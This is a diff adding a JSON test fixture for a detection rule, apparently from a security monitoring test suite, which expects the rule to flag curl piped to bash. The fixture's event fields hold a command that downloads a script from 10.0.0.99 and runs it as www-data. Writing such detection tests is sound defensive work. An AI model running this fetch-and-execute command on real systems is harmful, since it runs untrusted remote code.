@@ -1,0 +1,18 @@
+{
+  "rule": "CEL-LIN-CURL-BASH",
+  "expect": "match",
+  "description": "curl piped to bash remote code execution pattern",
+  "event": {
+    "id": "fx-cel-lin-curl-bash-1",
+    "dataType": "linux",
+    "dataSource": "fixture-agent",
+    "tenantId": "1",
+    "raw": "bash -c \"curl -fsSL http://10.0.0.99/i.sh | bash\"",
+    "origin": {
+      "host": "fx-lin-02",
+      "process": "bash",
+      "command": "curl -fsSL http://10.0.0.99/i.sh | bash",
+      "user": "www-data"
+    }
+  }
+}
